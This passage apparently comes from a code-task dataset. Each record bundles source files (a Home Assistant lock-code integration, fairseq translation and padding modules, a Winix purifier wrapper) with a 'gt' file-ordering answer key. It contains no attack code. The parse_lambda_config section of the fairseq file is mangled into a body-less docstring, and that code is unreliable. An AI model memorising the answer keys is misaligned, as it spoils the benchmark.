locks_to_watch\n                ),\n            )\n\n    if primary_lock.parent is not None:\n        await init_child_locks(\n            hass,\n            config_entry.data[CONF_START],\n            config_entry.data[CONF_SLOTS],\n            config_entry.data[CONF_LOCK_NAME],\n        )\n\n    await system_health_check(hass, config_entry)\n    return True\n\n\nasync def system_health_check(hass: HomeAssistant, config_entry: ConfigEntry) -> None:\n\n    primary_lock = hass.data[DOMAIN][config_entry.entry_id][PRIMARY_LOCK]\n\n    if async_using_zwave_js(lock=primary_lock):\n        hass.data[DOMAIN][INTEGRATION] = \"zwave_js\"\n    else:\n        hass.data[DOMAIN][INTEGRATION] = \"unknown\"\n\n    hass.data[DOMAIN][\"network_sensor\"] = slugify(f\"{primary_lock.lock_name}: Network\")\n\n\nasync def async_unload_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> bool:\n\n    lockname = config_entry.data[CONF_LOCK_NAME]\n    notification_id = f\"{DOMAIN}_{lockname}_unload\"\n    async_create(\n        hass,\n        (\n            f\"Removing `{lockname}` and all of the files that were generated for \"\n            \"it. This may take some time so don't panic. This message will \"\n            \"automatically clear when removal is complete.\"\n        ),\n        title=f\"{DOMAIN.title()} - Removing `{lockname}`\",\n        notification_id=notification_id,\n    )\n\n    unload_ok = all(\n        await asyncio.gather(\n            *[\n                hass.config_entries.async_forward_entry_unload(config_entry, platform)\n                for platform in PLATFORMS\n            ]\n        )\n    )\n\n    if unload_ok:\n\n        await hass.async_add_executor_job(\n            delete_lock_and_base_folder, hass, config_entry\n        )\n\n        await async_reload_package_platforms(hass)\n\n\n        for unsub_listener in hass.data[DOMAIN][config_entry.entry_id].get(\n            UNSUB_LISTENERS, []\n        ):\n            unsub_listener()\n        hass.data[DOMAIN][config_entry.entry_id].get(UNSUB_LISTENERS, []).clear()\n\n        hass.data[DOMAIN].pop(config_entry.entry_id)\n\n    async_dismiss(hass, notification_id)\n\n    return unload_ok\n\n\nasync def async_migrate_entry(hass: HomeAssistant, config_entry: ConfigEntry) -> bool:\n\n    version = config_entry.version\n\n\n    if version == 1:\n        _LOGGER.debug(\"Migrating from version %s\", version)\n        data = config_entry.data.copy()\n\n        data[CONF_ALARM_LEVEL_OR_USER_CODE_ENTITY_ID] = data.pop(CONF_ALARM_LEVEL, None)\n        data[CONF_ALARM_TYPE_OR_ACCESS_CONTROL_ENTITY_ID] = data.pop(\n            CONF_ALARM_TYPE, None\n        )\n        data[CONF_LOCK_ENTITY_ID] = data.pop(CONF_ENTITY_ID)\n        if CONF_HIDE_PINS not in data:\n            data[CONF_HIDE_PINS] = DEFAULT_HIDE_PINS\n        data[CONF_CHILD_LOCKS_FILE] = data.get(CONF_CHILD_LOCKS_FILE, \"\")\n\n        hass.config_entries.async_update_entry(entry=config_entry, data=data)\n        config_entry.version = 2\n        _LOGGER.debug(\"Migration to version %s complete\", config_entry.version)\n\n    return True\n\n\nasync def update_listener(hass: HomeAssistant, config_entry: ConfigEntry) -> None:\n\n\n    if not config_entry.options:\n        return\n\n\n\n    if config_entry.options[CONF_PATH] != config_entry.data[CONF_PATH]:\n        await hass.async_add_executor_job(\n            delete_folder, hass.config.path(), config_entry.data[CONF_PATH]\n        )\n    elif config_entry.options[CONF_LOCK_NAME] != config_entry.data[CONF_LOCK_NAME]:\n        await hass.async_add_executor_job(\n            delete_folder,\n            hass.config.path(),\n            config_entry.data[CONF_PATH],\n            config_entry.data[CONF_LOCK_NAME],\n        )\n\n    old_slots = get_code_slots_list(config_entry.data)\n    new_slots = get_code_slots_list(config_entry.options)\n\n    new_data = config_entry.options.copy()\n    new_data.pop(CONF_GENERATE, None)\n\n    hass.config_entries.async_update_entry(\n        entry=config_entry,\n        unique_id=config_entry.options[CONF_LOCK_NAME],\n        data=new_data,\n        options={},\n    )\n\n    primary_lock, child_locks = await generate_keymaster_locks(hass, config_entry)\n\n    hass.data[DOMAIN][config_entry.entry_id].update(\n        {\n            PRIMARY_LOCK: primary_lock,\n            CHILD_LOCKS: child_locks,\n        }\n    )\n    servicedata = {\"lockname\": primary_lock.lock_name}\n    await hass.services.async_call(\n        DOMAIN, SERVICE_GENERATE_PACKAGE, servicedata, blocking=True\n    )\n\n    if old_slots != new_slots:\n        async_dispatcher_send(\n            hass,\n            f\"{DOMAIN}_{config_entry.entry_id}_code_slots_changed\",\n            old_slots,\n            new_slots,\n        )\n\n\n    for unsub_listener in hass.data[DOMAIN][config_entry.entry_id].get(\n        UNSUB_LISTENERS, []\n    ):\n        unsub_listener()\n    hass.data[DOMAIN][config_entry.entry_id].get(UNSUB_LISTENERS, []).clear()\n\n    if async_using_zwave_js(lock=primary_lock):\n        hass.data[DOMAIN][config_entry.entry_id][UNSUB_LISTENERS].append(\n            hass.bus.async_listen(\n                ZWAVE_JS_NOTIFICATION_EVENT,\n                functools.partial(handle_zwave_js_event, hass, config_entry),\n            )\n        )\n        return\n\n\n\n\n\n\n    locks_to_watch = []\n    for lock in [primary_lock, *child_locks]:\n        if lock.alarm_level_or_user_code_entity_id not in (\n            None,\n            \"sensor.fake\",\n        ) and lock.alarm_type_or_access_control_entity_id not in (None, \"sensor.fake\"):\n            locks_to_watch.append(lock)\n\n    if locks_to_watch:\n\n        hass.data[DOMAIN][config_entry.entry_id][UNSUB_LISTENERS].append(\n            async_track_state_change(\n                hass,\n                [lock.lock_entity_id for lock in locks_to_watch],\n                functools.partial(handle_state_change, hass, config_entry),\n                from_state=[STATE_LOCKED, STATE_UNLOCKED],\n                to_state=[STATE_LOCKED, STATE_UNLOCKED],\n            )\n        )\n\n\nclass LockUsercodeUpdateCoordinator(DataUpdateCoordinator):\n\n\n    def __init__(\n        self, hass: HomeAssistant, config_entry: ConfigEntry, ent_reg: EntityRegistry\n    ) -> None:\n        self._primary_lock: KeymasterLock = hass.data[DOMAIN][config_entry.entry_id][\n            PRIMARY_LOCK\n        ]\n        self._child_locks: List[KeymasterLock] = hass.data[DOMAIN][\n            config_entry.entry_id\n        ][CHILD_LOCKS]\n        self.config_entry = config_entry\n        self.ent_reg = ent_reg\n        self.network_sensor = None\n        self.slots = None\n        super().__init__(\n            hass,\n            _LOGGER,\n            name=DOMAIN,\n            update_interval=timedelta(seconds=5),\n            update_method=self.async_update_usercodes,\n        )\n        self.data = {}\n\n    def _invalid_code(self, code_slot):\n\n\n        _LOGGER.debug(\"Work around code in use.\")\n\n        data = \"\"\n\n\n        active_binary_sensor = (\n            f\"binary_sensor.active_{self._primary_lock.lock_name}_{code_slot}\"\n        )\n        active = self.hass.states.get(active_binary_sensor)\n        pin_data = f\"input_text.{self._primary_lock.lock_name}_pin_{code_slot}\"\n        pin = self.hass.states.get(pin_data)\n\n\n        if active is not None and pin is not None:\n            if active.state == \"on\" and pin.state.isnumeric():\n                _LOGGER.debug(\"Utilizing BE469 work around code.\")\n                data = pin.state\n            else:\n                _LOGGER.debug(\"Utilizing FE599 work around code.\")\n                data = \"\"\n\n        return data\n\n    async def async_update_usercodes(self) -> Dict[Union[str, int], Any]:\n\n        self.slots = get_code_slots_list(self.config_entry.data)\n        if not self.network_sensor:\n            self.network_sensor = self.ent_reg.async_get_entity_id(\n                \"binary_sensor\",\n                DOMAIN,\n                slugify(generate_binary_sensor_name(self._primary_lock.lock_name)),\n            )\n        if self.network_sensor is None:\n            raise UpdateFailed\n        try:\n            network_ready = self.hass.states.get(self.network_sensor)\n            if not network_ready:\n\n                self.network_sensor = None\n                raise ZWaveNetworkNotReady\n\n            if network_ready.state != STATE_ON:\n                raise ZWaveNetworkNotReady\n\n            return await self._async_update()\n        except (\n            NativeNotFoundError,\n            NativeNotSupportedError,\n            NoNodeSpecifiedError,\n            ZWaveIntegrationNotConfiguredError,\n            ZWaveNetworkNotReady,\n        ) as err:\n\n            if not self.data:\n                return {}\n            raise UpdateFailed from err\n\n    async def _async_update(self) -> Dict[Union[str, int], Any]:\n\n\n        instance_id = 1\n        data = {CONF_LOCK_ENTITY_ID: self._primary_lock.lock_entity_id}\n\n\n\n\n\n\n\n        if async_using_zwave_js(lock=self._primary_lock):\n            node: ZwaveJSNode = self._primary_lock.zwave_js_lock_node\n            if node is None:\n                raise NativeNotFoundError\n            code_slot = 1\n\n            for slot in get_usercodes(node):\n                code_slot = int(slot[ATTR_CODE_SLOT])\n                usercode: Optional[str] = slot[ATTR_USERCODE]\n                in_use: Optional[bool] = slot[ATTR_IN_USE]\n\n                if in_use is None and code_slot in self.slots:\n                    usercode_resp = await get_usercode_from_node(node, code_slot)\n                    usercode = slot[ATTR_USERCODE] = usercode_resp[ATTR_USERCODE]\n                    in_use = slot[ATTR_IN_USE] = usercode_resp[ATTR_IN_USE]\n                if not in_use:\n                    _LOGGER.debug(\"DEBUG: Code slot %s not enabled\", code_slot)\n                    data[code_slot] = \"\"\n                elif usercode and \"*\" in str(usercode):\n                    _LOGGER.debug(\n                        \"DEBUG: Ignoring code slot with * in value for code slot %s\",\n                        code_slot,\n                    )\n                    data[code_slot] = self._invalid_code(code_slot)\n                else:\n                    _LOGGER.debug(\"DEBUG: Code slot %s value: %s\", code_slot, usercode)\n                    data[code_slot] = usercode\n\n        else:\n            raise ZWaveIntegrationNotConfiguredError\n\n        return data\n",
        "gt": [
            "'keymaster/custom_components/keymaster/lock.py'",
            "'keymaster/custom_components/keymaster/__init__.py'",
            "'keymaster/tests/test_services.py'"
        ]
    },
    {
        "files": [
            "'generic-pretrained-GEC/BART-GEC/fairseq/tasks/semisupervised_translation.py'",
            "'generic-pretrained-GEC/mBART-GEC/fairseq/data/pad_dataset.py'",
            "'generic-pretrained-GEC/mBART-GEC/fairseq/data/__init__.py'"
        ],
        "content": "'generic-pretrained-GEC/BART-GEC/fairseq/tasks/semisupervised_translation.py'\n:\n\n\n\n\nfrom collections import OrderedDict\nimport logging\nimport os\n\nfrom fairseq.data import (\n    BacktranslationDataset,\n    data_utils,\n    indexed_dataset,\n    IndexedCachedDataset,\n    IndexedDataset,\n    IndexedRawTextDataset,\n    LanguagePairDataset,\n    NoisingDataset,\n    RoundRobinZipDatasets,\n)\nfrom fairseq.models import FairseqMultiModel\nfrom fairseq.sequence_generator import SequenceGenerator\n\nfrom .multilingual_translation import MultilingualTranslationTask\nfrom . import register_task\n\n\nlogger = logging.getLogger(__name__)\n\n\ndef _get_bt_dataset_key(lang_pair):\n    return \"bt:\" + lang_pair\n\n\ndef _get_denoising_dataset_key(lang_pair):\n    return \"denoising:\" + lang_pair\n\n\n\ndef parse_lambda_config(x):\n    \"\"\"\n    Parse the configuration of lambda coefficient (for scheduling).\n    x = \"3\"\n    x = \"0:1,1000:0\"\n\n    x = \"0:0,1000:0,2000:1\"\n\n    A task for training multiple translation models simultaneously.\n\n    We iterate round-robin over batches from multiple language pairs, ordered\n    according to the `--lang-pairs` argument.\n\n    The training loop is roughly:\n\n        for i in range(len(epoch)):\n            for lang_pair in args.lang_pairs:\n                batch = next_batch_for_lang_pair(lang_pair)\n                loss = criterion(model_for_lang_pair(lang_pair), batch)\n                loss.backward()\n            optimizer.step()\n\n    In practice, `next_batch_for_lang_pair` is abstracted in a FairseqDataset\n    (e.g., `RoundRobinZipDatasets`) and `model_for_lang_pair` is a model that\n    implements the `FairseqMultiModel` interface.\n\n    During inference it is required to specify a single `--source-lang` and\n    `--target-lang`, instead of `--lang-pairs`.\n    Add task-specific arguments to the parser.\"\"\"\n\n        MultilingualTranslationTask.add_args(parser)\n        parser.add_argument('--lambda-parallel-config', default=\"1.0\", type=str, metavar='CONFIG',\n                            help='cross-entropy reconstruction coefficient (parallel data). '\n                                 'use fixed weight during training if set to floating point number. '\n                                 'use piecewise linear function over number of updates to schedule the '\n                                 'weight with the format: w0:step0,w1:step1,...')\n        parser.add_argument('--lambda-denoising-config', default=\"0.0\", type=str, metavar='CONFIG',\n                            help='Cross-entropy reconstruction coefficient (denoising autoencoding)'\n                                 'use fixed weight during training if set to floating point number. '\n                                 'use piecewise linear function over number of updates to schedule the '\n                                 'weight with the format: w0:step0,w1:step1,...')\n        parser.add_argument('--lambda-otf-bt-config', default=\"0.0\", type=str, metavar='CONFIG',\n                            help='cross-entropy reconstruction coefficient (on-the-fly back-translation parallel data)'\n                                 'use fixed weight during training if set to floating point number. '\n                                 'use piecewise linear function over number of updates to schedule the '\n                                 'weight with the format: w0:step0,w1:step1,...')\n        parser.add_argument('--bt-max-len-a', default=1.1, type=float, metavar='N',\n                            help='generate back-translated sequences of maximum length ax + b, where x is the '\n                                 'source length')\n        parser.add_argument('--bt-max-len-b', default=10.0, type=float, metavar='N',\n                            help='generate back-translated sequences of maximum length ax + b, where x is the '\n                                 'source length')\n        parser.add_argument('--bt-beam-size', default=1, type=int, metavar='N',\n                            help='beam size used in beam search of online back-translation')\n        parser.add_argument('--max-word-shuffle-distance', default=3.0, type=float, metavar='N',\n                            help='maximum word shuffle distance for denoising autoencoding data generation')\n        parser.add_argument('--word-dropout-prob', default=0.1, type=float, metavar='N',\n                            help='word dropout probability for denoising autoencoding data generation')\n        parser.add_argument('--word-blanking-prob', default=0.2, type=float, metavar='N',\n                            help='word blanking probability for denoising autoencoding data generation')\n\n\n    def __init__(self, args, dicts, training):\n        super().__init__(args, dicts, training)\n        self.lambda_parallel, self.lambda_parallel_steps = parse_lambda_config(args.lambda_parallel_config)\n        self.lambda_otf_bt, self.lambda_otf_bt_steps = parse_lambda_config(args.lambda_otf_bt_config)\n        self.lambda_denoising, self.lambda_denoising_steps = parse_lambda_config(args.lambda_denoising_config)\n        if (self.lambda_denoising > 0.0 or self.lambda_denoising_steps is not None):\n            denoising_lang_pairs = [\n                \"%s-%s\" % (tgt, tgt)\n                for tgt in {lang_pair.split('-')[1] for lang_pair in args.lang_pairs}\n            ]\n            self.model_lang_pairs = self.model_lang_pairs + denoising_lang_pairs\n        self.backtranslate_datasets = {}\n        self.backtranslators = {}\n\n    @classmethod\n    def setup_task(cls, args, **kwargs):\n        dicts, training = MultilingualTranslationTask.prepare(args, **kwargs)\n        return cls(args, dicts, training)\n\n    def load_dataset(self, split, epoch=0, **kwargs):\n\n\n        paths = self.args.data.split(os.pathsep)\n        assert len(paths) > 0\n        data_path = paths[epoch % len(paths)]\n\n        def split_exists(split, src, tgt, lang):\n            if src is not None:\n                filename = os.path.join(data_path, '{}.{}-{}.{}'.format(split, src, tgt, lang))\n            else:\n                filename = os.path.join(data_path, '{}.{}-None.{}'.format(split, src, tgt))\n            return indexed_dataset.dataset_exists(filename, impl=self.args.dataset_impl)\n\n        def load_indexed_dataset(path, dictionary):\n            return data_utils.load_indexed_dataset(path, dictionary, self.args.dataset_impl)\n\n\n        src_datasets, tgt_datasets = {}, {}\n        if (self.lambda_parallel > 0.0 or self.lambda_parallel_steps is not None or not split.startswith(\"train\")):\n            for lang_pair in self.lang_pairs:\n                src, tgt = lang_pair.split('-')\n                if split_exists(split, src, tgt, src):\n                    prefix = os.path.join(data_path, '{}.{}-{}.'.format(split, src, tgt))\n                elif split_exists(split, tgt, src, src):\n                    prefix = os.path.join(data_path, '{}.{}-{}.'.format(split, tgt, src))\n                else:\n                    continue\n                src_datasets[lang_pair] = load_indexed_dataset(prefix + src, self.dicts[src])\n                tgt_datasets[lang_pair] = load_indexed_dataset(prefix + tgt, self.dicts[tgt])\n                logger.info('parallel-{} {} {} examples'.format(data_path, split, len(src_datasets[lang_pair])))\n            if len(src_datasets) == 0:\n                raise FileNotFoundError('Dataset not found: {} ({})'.format(split, data_path))\n\n\n        backtranslate_datasets = {}\n        if (self.lambda_otf_bt > 0.0 or self.lambda_otf_bt_steps is not None) and split.startswith(\"train\"):\n            for lang_pair in self.lang_pairs:\n                src, tgt = lang_pair.split('-')\n                if not split_exists(split, tgt, None, tgt):\n                    raise FileNotFoundError('Dataset not found: backtranslation {} ({})'.format(split, data_path))\n                filename = os.path.join(data_path, '{}.{}-None.{}'.format(split, tgt, tgt))\n                dataset = load_indexed_dataset(filename, self.dicts[tgt])\n                lang_pair_dataset_tgt = LanguagePairDataset(\n                    dataset,\n                    dataset.sizes,\n                    self.dicts[tgt],\n                    left_pad_source=self.args.left_pad_source,\n                    left_pad_target=self.args.left_pad_target,\n                )\n                lang_pair_dataset = LanguagePairDataset(\n                    dataset,\n                    dataset.sizes,\n                    src_dict=self.dicts[src],\n                    tgt=dataset,\n                    tgt_sizes=dataset.sizes,\n                    tgt_dict=self.dicts[tgt],\n                    left_pad_source=self.args.left_pad_source,\n                    left_pad_target=self.args.left_pad_target,\n                )\n                backtranslate_datasets[lang_pair] = BacktranslationDataset(\n                    tgt_dataset=self.alter_dataset_langtok(\n                        lang_pair_dataset_tgt,\n                        src_eos=self.dicts[tgt].eos(),\n                        src_lang=tgt,\n                        tgt_lang=src,\n                    ),\n                    backtranslation_fn=self.backtranslators[lang_pair],\n                    src_dict=self.dicts[src], tgt_dict=self.dicts[tgt],\n                    output_collater=self.alter_dataset_langtok(\n                        lang_pair_dataset=lang_pair_dataset,\n                        src_eos=self.dicts[src].eos(),\n                        src_lang=src,\n                        tgt_eos=self.dicts[tgt].eos(),\n                        tgt_lang=tgt,\n                    ).collater,\n                )\n                logger.info('backtranslate-{}: {} {} {} examples'.format(\n                    tgt, data_path, split, len(backtranslate_datasets[lang_pair]),\n                ))\n                self.backtranslate_datasets[lang_pair] = backtranslate_datasets[lang_pair]\n\n\n        noising_datasets = {}\n        if (self.lambda_denoising > 0.0 or self.lambda_denoising_steps is not None) and split.startswith(\"train\"):\n            for lang_pair in self.lang_pairs:\n                _, tgt = lang_pair.split('-')\n                if not split_exists(split, tgt, None, tgt):\n                    continue\n                filename = os.path.join(data_path, '{}.{}-None.{}'.format(split, tgt, tgt))\n                tgt_dataset1 = load_indexed_dataset(filename, self.dicts[tgt])\n                tgt_dataset2 = load_indexed_dataset(filename, self.dicts[tgt])\n                noising_dataset = NoisingDataset(\n                    tgt_dataset1,\n                    self.dicts[tgt],\n                    seed=1,\n                    max_word_shuffle_distance=self.args.max_word_shuffle_distance,\n                    word_dropout_prob=self.args.word_dropout_prob,\n                    word_blanking_prob=self.args.word_blanking_prob,\n                )\n                noising_datasets[lang_pair] = self.alter_dataset_langtok(\n                    LanguagePairDataset(\n                        noising_dataset,\n                        tgt_dataset1.sizes,\n                        self.dicts[tgt],\n                        tgt_dataset2,\n                        tgt_dataset2.sizes,\n                        self.dicts[tgt],\n                        left_pad_source=self.args.left_pad_source,\n                        left_pad_target=self.args.left_pad_target,\n                    ),\n                    src_eos=self.dicts[tgt].eos(),\n                    src_lang=tgt,\n                    tgt_eos=self.dicts[tgt].eos(),\n                    tgt_lang=tgt,\n                )\n                logger.info('denoising-{}: {} {} {} examples'.format(\n                    tgt, data_path, split, len(noising_datasets[lang_pair]),\n                ))\n\n        def language_pair_dataset(lang_pair):\n            src, tgt = lang_pair.split('-')\n            src_dataset, tgt_dataset = src_datasets[lang_pair], tgt_datasets[lang_pair]\n            return self.alter_dataset_langtok(\n                LanguagePairDataset(\n                    src_dataset, src_dataset.sizes, self.dicts[src],\n                    tgt_dataset, tgt_dataset.sizes, self.dicts[tgt],\n                    left_pad_source=self.args.left_pad_source,\n                    left_pad_target=self.args.left_pad_target,\n                    max_source_positions=self.args.max_source_positions,\n                    max_target_positions=self.args.max_target_positions,\n                ),\n                self.dicts[src].eos(),\n                src,\n                self.dicts[tgt].eos(),\n                tgt,\n            )\n\n        self.datasets[split] = RoundRobinZipDatasets(\n            OrderedDict([\n                (lang_pair, language_pair_dataset(lang_pair))\n                for lang_pair in src_datasets.keys()\n            ] + [\n                (_get_bt_dataset_key(lang_pair), dataset)\n                for lang_pair, dataset in backtranslate_datasets.items()\n            ] + [\n                (_get_denoising_dataset_key(lang_pair), dataset)\n                for lang_pair, dataset in noising_datasets.items()\n            ]),\n            eval_key=None if self.training else \"%s-%s\" % (self.args.source_lang, self.args.target_lang),\n        )\n\n    def build_model(self, args):\n        from fairseq import models\n        model = models.build_model(args, self)\n        if not isinstance(model, FairseqMultiModel):\n            raise ValueError('SemisupervisedTranslationTask requires a FairseqMultiModel architecture')\n\n\n        self.sequence_generators = {}\n        if (self.lambda_otf_bt > 0.0 or self.lambda_otf_bt_steps is not None) and self.training:\n            for lang_pair in self.lang_pairs:\n                src, tgt = lang_pair.split('-')\n                key = '{}-{}'.format(tgt, src)\n                self.sequence_generators[key] = SequenceGenerator(\n                    tgt_dict=self.dicts[src],\n                    beam_size=args.bt_beam_size,\n                    max_len_a=args.bt_max_len_a,\n                    max_len_b=args.bt_max_len_b,\n                )\n                decoder_lang_tok_idx = self.get_decoder_langtok(src)\n\n                def backtranslate_fn(\n                    sample, model=model.models[key],\n                    bos_token=decoder_lang_tok_idx,\n                    sequence_generator=self.sequence_generators[key],\n                ):\n                    return sequence_generator.generate(\n                        [model],\n                        sample,\n                        bos_token=bos_token,\n                    )\n                self.backtranslators[lang_pair] = backtranslate_fn\n\n        return model\n\n    def train_step(self, sample, model, criterion, optimizer, ignore_grad=False):\n        model.train()\n        agg_loss, agg_sample_size, agg_logging_output = 0., 0., {}\n\n        def forward_backward(model, samples, logging_output_key, weight):\n            nonlocal agg_loss, agg_sample_size, agg_logging_output\n            if samples is None or len(samples) == 0:\n                return\n            loss, sample_size, logging_output = criterion(model, samples)\n            if ignore_grad:\n                loss *= 0\n            else:\n                loss *= weight\n            optimizer.backward(loss)\n            agg_loss += loss.detach().item()\n\n            agg_sample_size += sample_size\n            agg_logging_output[logging_output_key] = logging_output\n\n        if self.lambda_parallel > 0.0:\n            for lang_pair in self.lang_pairs:\n                forward_backward(model.models[lang_pair], sample[lang_pair], lang_pair, self.lambda_parallel)\n\n        if self.lambda_otf_bt > 0.0:\n            for lang_pair in self.lang_pairs:\n                sample_key = _get_bt_dataset_key(lang_pair)\n                forward_backward(model.models[lang_pair], sample[sample_key], sample_key, self.lambda_otf_bt)\n\n        if self.lambda_denoising > 0.0:\n            for lang_pair in self.lang_pairs:\n                _, tgt = lang_pair.split('-')\n                sample_key = _get_denoising_dataset_key(lang_pair)\n                forward_backward(model.models['{0}-{0}'.format(tgt)], sample[sample_key], sample_key, self.lambda_denoising)\n\n        return agg_loss, agg_sample_size, agg_logging_output\n\n    def update_step(self, num_updates):\n        def lambda_step_func(config, n_iter):\n\n            ranges = [i for i in range(len(config) - 1) if config[i][0] <= n_iter < config[i + 1][0]]\n            if len(ranges) == 0:\n                assert n_iter >= config[-1][0]\n                return config[-1][1]\n            assert len(ranges) == 1\n            i = ranges[0]\n            x_a, y_a = config[i]\n            x_b, y_b = config[i + 1]\n            return y_a + (n_iter - x_a) * float(y_b - y_a) / float(x_b - x_a)\n\n        if self.lambda_parallel_steps is not None:\n            self.lambda_parallel = lambda_step_func(self.lambda_parallel_steps, num_updates)\n        if self.lambda_denoising_steps is not None:\n            self.lambda_denoising = lambda_step_func(self.lambda_denoising_steps, num_updates)\n        if self.lambda_otf_bt_steps is not None:\n            self.lambda_otf_bt = lambda_step_func(self.lambda_otf_bt_steps, num_updates)\n\n    def aggregate_logging_outputs(self, logging_outputs, criterion):\n\n        logging_output_keys = {\n            key\n            for logging_output in logging_outputs\n            for key in logging_output\n        }\n        lang_pair_keys = set(self.lang_pairs + [\n            _get_bt_dataset_key(lang_pair)\n            for lang_pair in self.lang_pairs\n        ] + [\n            _get_denoising_dataset_key(lang_pair)\n            for lang_pair in self.lang_pairs\n        ])\n        logging_output_keys = logging_output_keys.intersection(lang_pair_keys)\n        return super().aggregate_logging_outputs(logging_outputs, criterion, logging_output_keys)\n\n'generic-pretrained-GEC/mBART-GEC/fairseq/data/pad_dataset.py'\n:\n\n\n\n\nfrom fairseq.data import data_utils\n\nfrom . import BaseWrapperDataset\n\n\nclass PadDataset(BaseWrapperDataset):\n\n    def __init__(self, dataset, pad_idx, left_pad):\n        super().__init__(dataset)\n        self.pad_idx = pad_idx\n        self.left_pad = left_pad\n\n    def collater(self, samples):\n        return data_utils.collate_tokens(samples, self.pad_idx, left_pad=self.left_pad)\n\n\nclass LeftPadDataset(PadDataset):\n\n    def __init__(self, dataset, pad_idx):\n        super().__init__(dataset, pad_idx, left_pad=True)\n\n\nclass RightPadDataset(PadDataset):\n\n    def __init__(self, dataset, pad_idx):\n        super().__init__(dataset, pad_idx, left_pad=False)\n\n'generic-pretrained-GEC/mBART-GEC/fairseq/data/__init__.py'\n:\n\n\n\n\nfrom .dictionary import Dictionary, TruncatedDictionary\n\nfrom .fairseq_dataset import FairseqDataset, FairseqIterableDataset\n\nfrom .base_wrapper_dataset import BaseWrapperDataset\n\nfrom .append_token_dataset import AppendTokenDataset\nfrom .audio.raw_audio_dataset import FileAudioDataset\nfrom .backtranslation_dataset import BacktranslationDataset\nfrom .colorize_dataset import ColorizeDataset\nfrom .concat_dataset import ConcatDataset\nfrom .concat_sentences_dataset import ConcatSentencesDataset\nfrom .denoising_dataset import DenoisingDataset\nfrom .id_dataset import IdDataset\nfrom .indexed_dataset import IndexedCachedDataset, IndexedDataset, IndexedRawTextDataset, MMapIndexedDataset\nfrom .language_pair_dataset import LanguagePairDataset\nfrom .list_dataset import ListDataset\nfrom .lm_context_window_dataset import LMContextWindowDataset\nfrom .lru_cache_dataset import LRUCacheDataset\nfrom .mask_tokens_dataset import MaskTokensDataset\nfrom .monolingual_dataset import MonolingualDataset\nfrom .multi_corpus_sampled_dataset import MultiCorpusSampledDataset\nfrom .nested_dictionary_dataset import NestedDictionaryDataset\nfrom .noising import NoisingDataset\nfrom .numel_dataset import NumelDataset\nfrom .num_samples_dataset import NumSamplesDataset\nfrom .offset_tokens_dataset import OffsetTokensDataset\nfrom .pad_dataset import LeftPadDataset, PadDataset, RightPadDataset\nfrom .prepend_dataset import PrependDataset\nfrom .prepend_token_dataset import PrependTokenDataset\nfrom .raw_label_dataset import RawLabelDataset\nfrom .replace_dataset import ReplaceDataset\nfrom .resampling_dataset import ResamplingDataset\nfrom .roll_dataset import RollDataset\nfrom .round_robin_zip_datasets import RoundRobinZipDatasets\nfrom .sharded_dataset import ShardedDataset\nfrom .sort_dataset import SortDataset\nfrom .strip_token_dataset import StripTokenDataset\nfrom .subsample_dataset import SubsampleDataset\nfrom .token_block_dataset import TokenBlockDataset\nfrom .transform_eos_dataset import TransformEosDataset\nfrom .transform_eos_lang_pair_dataset import TransformEosLangPairDataset\nfrom .truncate_dataset import TruncateDataset\n\nfrom .iterators import (\n    CountingIterator,\n    EpochBatchIterator,\n    GroupedIterator,\n    ShardedIterator,\n)\n\n__all__ = [\n    'AppendTokenDataset',\n    'BacktranslationDataset',\n    'BaseWrapperDataset',\n    'ColorizeDataset',\n    'ConcatDataset',\n    'ConcatSentencesDataset',\n    'CountingIterator',\n    'DenoisingDataset',\n    'Dictionary',\n    'EpochBatchIterator',\n    'FairseqDataset',\n    'FairseqIterableDataset',\n    'GroupedIterator',\n    'IdDataset',\n    'IndexedCachedDataset',\n    'IndexedDataset',\n    'IndexedRawTextDataset',\n    'LanguagePairDataset',\n    'LeftPadDataset',\n    'ListDataset',\n    'LMContextWindowDataset',\n    'LRUCacheDataset',\n    'MaskTokensDataset',\n    'MMapIndexedDataset',\n    'MonolingualDataset',\n    'MultiCorpusSampledDataset',\n    'NestedDictionaryDataset',\n    'NoisingDataset',\n    'NumelDataset',\n    'NumSamplesDataset',\n    'OffsetTokensDataset',\n    'PadDataset',\n    'PrependDataset',\n    'PrependTokenDataset',\n    'ReplaceDataset',\n    'RollDataset',\n    'FileAudioDataset',\n    'RawLabelDataset',\n    'ResamplingDataset',\n    'RightPadDataset',\n    'RoundRobinZipDatasets',\n    'ShardedDataset',\n    'ShardedIterator',\n    'SortDataset',\n    'StripTokenDataset',\n    'SubsampleDataset',\n    'TokenBlockDataset',\n    'TransformEosDataset',\n    'TransformEosLangPairDataset',\n    'TruncateDataset',\n    'TruncatedDictionary',\n]\n",
        "gt": [
            "'generic-pretrained-GEC/mBART-GEC/fairseq/data/pad_dataset.py'",
            "'generic-pretrained-GEC/mBART-GEC/fairseq/data/__init__.py'",
            "'generic-pretrained-GEC/BART-GEC/fairseq/tasks/semisupervised_translation.py'"
        ]
    },
    {
        "files": [
            "'winix/custom_components/winix/device_wrapper.py'",
            "'winix/custom_components/winix/const.py'",
            "'winix/custom_components/winix/fan.py'",
            "'winix/tests/test_fan.py'"
        ],
        "content": "'winix/custom_components/winix/device_wrapper.py'\n:\n\nfrom __future__ import annotations\n\nimport dataclasses\n\nimport aiohttp\n\nfrom .const import (\n    AIRFLOW_LOW,\n    AIRFLOW_SLEEP,\n    ATTR_AIRFLOW,\n    ATTR_MODE,\n    ATTR_PLASMA,\n    ATTR_POWER,\n    MODE_AUTO,\n    MODE_MANUAL,\n    OFF_VALUE,\n    ON_VALUE,\n    PRESET_MODE_AUTO,\n    PRESET_MODE_AUTO_PLASMA_OFF,\n    PRESET_MODE_MANUAL,\n    PRESET_MODE_MANUAL_PLASMA_OFF,\n    PRESET_MODE_SLEEP,\n    PRESET_MODES,\n    NumericPresetModes,\n)\nfrom .driver import WinixDriver\n\n\n@dataclasses.dataclass\nclass MyWinixDeviceStub:\n\n\n    id: str\n    mac: str\n    alias: str\n    location_code: str\n    filter_replace_date: str\n    model: str\n    sw_version: str\n\n\nclass WinixDeviceWrapper:\n\n\n\n\n    def __init__(\n        self,\n        client: aiohttp.ClientSession,\n        device_stub: MyWinixDeviceStub,\n        logger,\n    ) -> None:\n\n\n        self._driver = WinixDriver(device_stub.id, client)\n\n\n        self._state = {}\n\n        self._on = False\n        self._auto = False\n        self._manual = False\n        self._plasma_on = False\n        self._sleep = False\n        self._logger = logger\n\n        self.device_stub = device_stub\n        self._alias = device_stub.alias\n\n    async def update(self) -> None:\n\n        self._state = await self._driver.get_state()\n        self._auto = self._manual = self._sleep = self._plasma_on = False\n\n        self._on = self._state.get(ATTR_POWER) == ON_VALUE\n      